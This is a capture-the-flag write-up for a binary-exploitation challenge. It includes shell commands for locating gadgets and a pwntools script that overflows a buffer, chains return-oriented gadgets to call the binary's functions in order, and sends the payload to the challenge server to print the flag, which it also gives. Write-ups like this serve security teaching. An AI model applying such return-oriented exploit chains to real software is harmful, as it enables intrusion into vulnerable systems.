#### Challenge:

Didn't get an alien in Area51, but I found this... [rop_me_like_a_hurricane](./rop_me_like_a_hurricane ":ignore")

---

#### Solution:

- https://ctf101.org/binary-exploitation/return-oriented-programming/
- https://github.com/sashs/Ropper

```bash
for f in "./broken/lost+found/#65281/"*; do
    strings ./$f | grep -i flag.txt && echo $f;
done
strings ./rop_me_like_a_hurricane | grep -i tuctf # nc chal.tuctf.com 31058

# find propper gadget address
ropper --file ./rop_me_like_a_hurricane # 0x0804900e: ret;
```

```python
#!/usr/bin/env python2
from pwn import *

RET = 0x0804900e
BIN = "./rop_me_like_a_hurricane"


def exploit():
    e = ELF(BIN)
    payload = "A" * 28  # offset

    # execute functions in correct order
    payload += p32(RET)
    payload += p32(e.symbols['B'])

    payload += p32(RET)
    payload += p32(e.symbols['C'])

    payload += p32(RET)
    payload += p32(e.symbols['A'])

    # all conditions should be satisfied via prev function
    payload += p32(RET)
    payload += p32(e.symbols['printFlag'])
    payload += p32(0x804930a)

    return payload


if __name__ == "__main__":
    s = remote('chal.tuctf.com', 31058)
    s.sendlineafter("> ", exploit())
    s.interactive()

```

---

<details><summary>FLAG:</summary>

```
TUCTF{bu7_c4n_y0u_ROP_bl1ndf0ld3d?}
```

</details>
<br/>
